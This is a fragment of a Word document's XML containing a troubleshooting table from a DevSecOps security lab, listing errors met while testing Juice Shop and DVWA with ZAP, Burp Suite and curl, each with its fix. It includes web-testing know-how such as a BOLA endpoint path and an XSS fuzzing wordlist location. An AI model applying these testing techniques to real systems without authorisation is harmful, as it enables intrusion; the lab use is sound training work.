    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:before="320" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E75B6"/>
        </w:rPr>
        <w:t>All Roadblocks &amp; Fixes — Summary</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Every error encountered during the lab, with the exact fix:</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Module</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Roadblock</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
            <w:tcMar>
              <w:top w:w="80" w:type="dxa"/>
              <w:bottom w:w="80" w:type="dxa"/>
              <w:left w:w="120" w:type="dxa"/>
              <w:right w:w="120" w:type="dxa"/>
            </w:tcMar>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="CCCCCC"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="CCCCCC"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="CCCCCC"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="CCCCCC"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Fix</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M2</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git add fails — 'pathspec did not match'</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cd to repo root ('DSO essentials/') first. Read exact paths from git status.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'/zap/wrk' not mounted</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Add -v /tmp/zap-reports:/zap/wrk:rw to docker run.</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localhost unreachable inside container</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host.docker.internal:3000 instead of localhost:3000.</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ZAP Docker full scan crashes (arm64 / Apple Silicon)</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ZAP GUI natively — DomXSS scanner requires headless Firefox which crashes on arm64.</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BOLA returns 404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/identity/api/v2/vehicle/{uuid}/location not /workshop/api/vehicle/.</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M3.5</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curl returns 401 despite valid token</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Backslash line continuation in multi-line curl causes header to be dropped. Run as single line.</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Firefox not intercepting localhost:3000</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Remove localhost and 127.0.0.1 from Firefox proxy 'No proxy for:' field.</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Burp built-in browser shows DVWA instead of Juice Shop</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Firefox (Option A). Burp's built-in Chromium resolves localhost differently on macOS.</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HTTP History shows no POST requests</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Juice Shop is an Angular SPA — logins use XHR/fetch. Build requests manually in Repeater.</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408 Request Timeout in Burp Repeater</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HTTP/1.1 requires blank line after last header. Press Enter twice after the last header line.</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Burp Configure Target: 'Invalid host: localhost:3000'</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Set Host = localhost, Port = 3000, uncheck 'Use HTTPS'.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XSS wordlist curl returns 14 bytes (404)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SecLists moved the file. Use path: Fuzzing/XSS/robot-friendly/XSS-Jhaddix.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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Reviews endpoint returns 500: Unexpected path</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF0F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Use PUT not POST for /rest/products/{id}/reviews.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>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color w:val="C00000"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>M4</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sz w:val="20"/>
              </w:rPr>
              <w:t>401 Unauthorized: invalid signature on basket request</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF8F8"/>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color w:val="375623"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>JWT token expired. Re-run login request (Exercise 4.2) to get a fresh token.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="400"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="595959"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>DevSecOps &amp; AI Security Lab  |  Modules 1-4  |  Repo: https://github.com/akhil65/DSO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